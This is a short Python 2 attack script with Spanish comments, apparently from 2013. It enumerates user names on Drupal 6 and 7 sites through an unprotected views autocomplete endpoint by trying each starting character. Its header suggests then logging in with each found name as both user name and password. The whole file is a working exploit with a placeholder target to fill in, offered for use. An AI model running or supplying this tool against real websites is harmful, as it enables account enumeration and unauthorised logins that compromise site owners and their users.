#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Autor: @kr1shn4murt1
# Fecha: Noviembre 26 - 2013 
# Enumerador de identificadores de usuarios para una vulnerabilidad de drupal 7 y 6 que no 
# esta correctamente catalogada en las bases de datos de vulnerabilidades
# conocidas, se encontro la informacion en este link http://www.madirish.net/430
# Luego de tener el listado de identificadores de usuarios es posible ingresar 
# escribiendo en el formulario de login el identificador en el campo de 
# usuario y contrasenha, ejemplo de un identificador: A011074081 
# 

import urllib2

print ("Inicio de lectura de codigo fuente de la pagina web")

# Cambiar esta variable, poner la pagina que se quiere enumerar
Pagina_A_Enumerar= 'http://vulnerable.com'

directorio_Base= Pagina_A_Enumerar+'/admin/views/ajax/autocomplete/user/'

opener = urllib2.build_opener()

opener.addheaders.append(('Referer', directorio_Base))

# listado con los posibles caracteres con los que inicia un nombre de usuario
# en drupal
caracteres_Iniciales_De_Usuario= 'abcdefghijklmnopqrstuvwxyz.-123456789+'

#caracteres_Iniciales_De_Usuario= 'a'

usuarios_Encontrados=[]

for letra in caracteres_Iniciales_De_Usuario:

	#print 'Caracter probado: ',letra

	filehandle = opener.open(directorio_Base+letra)
	

	fuente= filehandle.read()

	# Cuando los usuarios empiezan por 1, no funciona el split como debe por que el usuario contiene una 
	#coma, reevaluar

	fuente= fuente.replace('{','')
	fuente= fuente.replace('}','')
	fuente= fuente.split(',')

	for usuario in fuente:
		# Hay varios usuarios anonymous, el if verifica que no se trate de uno de ellos
		if 'Anonymous' not in usuario:
			#print usuario.split(':')[0].replace('"','')
			# Se agrega cada usuario al array de usuarios encontrados
			usuarios_Encontrados.append(usuario.split(':')[0].replace('"',''))

	filehandle.close()

# Se imprimen todos los usuarios encontrados
for encontrado in usuarios_Encontrados:
	print encontrado